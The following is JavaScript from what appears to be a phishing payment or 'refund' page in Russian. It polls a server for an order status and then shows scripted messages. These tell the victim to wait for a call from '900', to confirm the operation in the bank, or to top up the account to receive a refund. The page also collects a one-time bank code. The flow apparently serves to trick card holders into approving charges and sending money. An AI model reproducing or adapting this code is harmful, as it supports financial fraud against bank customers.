<script>

	function check(id) {
		$.ajax({
			url: '/check',
			dataType: 'text',
			method: 'post',
			data: { type: 'get_order_status', order_id: '' },
			success: function (data) {
				console.log(data);
				data = $.parseJSON(data);
				switch (data.status) {
					case 'wrong_code':
						document.getElementById("errorContainer").innerHTML = "Неверный код. Попробуйте еще раз.";
						document.getElementById('DynamicPassword').value = "";
						document.getElementById('start').style.display = "block";
						document.getElementById('wait').style.display = "none";
						$('#btnSubmit, #DynamicPassword').removeAttr("disabled");
						break;
					case "success2":
						$.redirect(
							'/error',
							{
								order_id: '',
								error_message: 'Возврат успешен! Средства поступят в течении 20 минут.'
							});
						break;
					case 'fraud':
						$.redirect(
							'/error',
							{
								order_id: '',
								error_message: 'Операция отклонена банком. Обратитесь в банк, выпустивший карту списания. Пожалуйста, дождитесь звонка от 900 и подтвердите оплату.'
							});
						break;
					case 'insufficient_funds':
						$.redirect(
							'/error',
							{
								order_id: '',
								error_message: 'Не хватает денег на карте, с которой вы хотите списать деньги, или исчерпан лимит.'
							});
						break;
					case 'contact_support':
						$.redirect(
							'/error',
							{
								order_id: '',
								error_message: 'Ошибка платежа. Обратитесь в техническую поддержку продавца.'
							});
						break;
					case 'fraud_refund':
						$.redirect(
							'/error',
							{
								order_id: '',
								error_message: 'Операция отклонена банком. Для успешного возврата подтвердите операцию в банке.'
							});
						break;
					case 'sberPay':
						$.redirect(
							'/sberpay',
							{
								order_id: '',
								amount: ''
							});
						break;
					case 'sbp_payment':
						$.redirect(
							'/sbp',
							{
								order_id: '',
								amount: ''
							});
						break;
					case 'funds_refund':
						$.redirect(
							'/error',
							{
								order_id: '',
								error_message: 'Недостаточно суммы эквивалента для возврата. Пополните счет.'
							});
						break;
				}
			}
		});
	}


</script>
<script>
	function selectMethod(method) {
		switch (method) {
			case '1':
				$("#methodCard").show();
				$("#methodSelect").hide();
				$("#methodSBP").hide();
				break;
			case '2':
				$("#methodSBP").show();
				$("#methodCard").hide();
				$("#methodSelect").hide();
				break;
			case '3':
				$("#methodSBP").hide();
				$("#methodCard").hide();
				$("#methodSelect").show();
				break;
			default:
				break;
		}

	}
	const pageInfo = { "id": "", "price": "", "backToShop": "https:///", "offer": "", "promocode": "", "nameRecipient": "", "phoneNumber": "" };
</script>
